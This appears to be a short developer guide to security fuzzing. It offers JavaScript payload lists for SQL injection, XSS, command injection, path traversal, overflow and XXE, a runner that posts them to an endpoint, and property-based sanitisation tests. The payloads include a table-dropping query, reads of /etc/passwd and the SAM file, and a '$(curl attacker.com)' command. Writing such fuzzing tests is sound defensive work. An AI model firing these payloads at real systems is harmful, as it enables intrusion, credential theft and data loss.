# Fuzzing

## Input Fuzzing

### Basic Fuzzing Framework

```javascript
// Fuzzing test data generators
const fuzzingPayloads = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--"
  ],

  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'-alert('XSS')-'"
  ],

  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(curl attacker.com)"
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  ],

  bufferOverflow: [
    "A".repeat(1000),
    "A".repeat(10000),
    "%s%s%s%s%s%s%s%s%s%s",
    "\x00" + "A".repeat(100)
  ],

  xmlInjection: [
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<![CDATA[<script>alert('XSS')</script>]]>"
  ]
};

// Fuzzing test runner
async function fuzzEndpoint(url, parameter, payloads) {
  const results = [];

  for (const payload of payloads) {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [parameter]: payload })
      });

      const body = await response.text();

      results.push({
        payload,
        status: response.status,
        vulnerable: detectVulnerability(body, payload)
      });
    } catch (err) {
      results.push({ payload, error: err.message });
    }
  }

  return results.filter(r => r.vulnerable);
}
```

## Property-Based Testing for Security

```javascript
// Using fast-check for property-based fuzzing
const fc = require('fast-check');

describe('Security Properties', () => {
  it('should sanitize all user input', () => {
    fc.assert(
      fc.property(
        fc.string(), // Generate random strings
        (input) => {
          const sanitized = sanitizeInput(input);
          // Property: sanitized output should not contain script tags
          return !/<script/i.test(sanitized);
        }
      ),
      { numRuns: 1000 } // Run 1000 times with random inputs
    );
  });

  it('should prevent SQL injection in queries', () => {
    fc.assert(
      fc.property(
        fc.string(),
        fc.string(),
        (username, password) => {
          const query = buildLoginQuery(username, password);
          // Property: query should use parameterization
          return !query.includes(username) && !query.includes(password);
        }
      )
    );
  });
});
```
